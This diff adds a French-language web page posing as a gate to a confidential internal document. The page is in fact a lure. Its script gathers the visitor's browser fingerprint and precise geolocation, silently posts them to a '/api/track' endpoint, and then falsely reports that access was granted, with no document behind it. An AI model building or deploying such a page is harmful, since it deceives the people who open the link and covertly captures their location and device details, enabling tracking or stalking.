@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document confidentiel</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #0f0f0f;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 400px;
+      text-align: center;
+    }
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h1 { font-size: 20px; margin-bottom: 8px; color: #fff; }
+    p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
+    .btn {
+      background: #2563eb;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 8px;
+      font-size: 15px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .btn:hover { background: #1d4ed8; }
+    .status {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #666;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📄</div>
+    <h1>Accès document interne</h1>
+    <p>Pour accéder à ce document, veuillez confirmer votre identité et autoriser la vérification de votre position.</p>
+    <button class="btn" onclick="requestAccess()">Accéder au document</button>
+    <div class="status" id="status">Vérification en cours...</div>
+  </div>
+
+  <script>
+    async function requestAccess() {
+      document.getElementById('status').style.display = 'block';
+      document.getElementById('status').textContent = 'Vérification en cours...';
+
+      // Collect basic info
+      const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenRes: `${screen.width}x${screen.height}`,
+        timestamp: new Date().toISOString(),
+        referrer: document.referrer,
+      };
+
+      // Try geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            data.lat = pos.coords.latitude;
+            data.lng = pos.coords.longitude;
+            data.accuracy = pos.coords.accuracy;
+            await sendData(data);
+          },
+          async () => {
+            data.lat = null;
+            data.lng = null;
+            data.geoError = 'refusé ou indisponible';
+            await sendData(data);
+          },
+          { timeout: 8000 }
+        );
+      } else {
+        data.geoError = 'non supporté';
+        await sendData(data);
+      }
+    }
+
+    async function sendData(data) {
+      try {
+        await fetch('/api/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch(e) {}
+      document.getElementById('status').textContent = '✅ Accès accordé. Chargement...';
+      // Optionnel : rediriger vers un vrai document après 2s
+      // setTimeout(() => window.location.href = '/document.pdf', 2000);
+    }
+  </script>
+</body>
+</html>
